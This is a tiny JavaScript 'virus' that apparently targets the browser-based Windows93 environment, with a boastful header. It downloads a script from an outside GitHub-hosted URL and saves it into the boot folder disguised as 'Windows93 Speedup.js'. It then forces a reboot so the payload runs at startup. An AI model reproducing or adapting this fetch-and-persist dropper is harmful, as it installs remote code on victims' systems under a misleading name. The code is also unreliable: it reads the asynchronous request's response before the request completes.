// 1337 virus developed by github.com/OutRite
// i will pwn you and your dog

function download_script(url) {
	var xhr = new XMLHttpRequest()
	xhr.open('GET', url)
	xhr.send()
	return xhr.response
}

var foo = download_script('https://raw.githack.com/OutRite/Basic93Virus/main/main.js')

$db.set("boot/Windows93 Speedup.js", foo)

$exe('reboot')
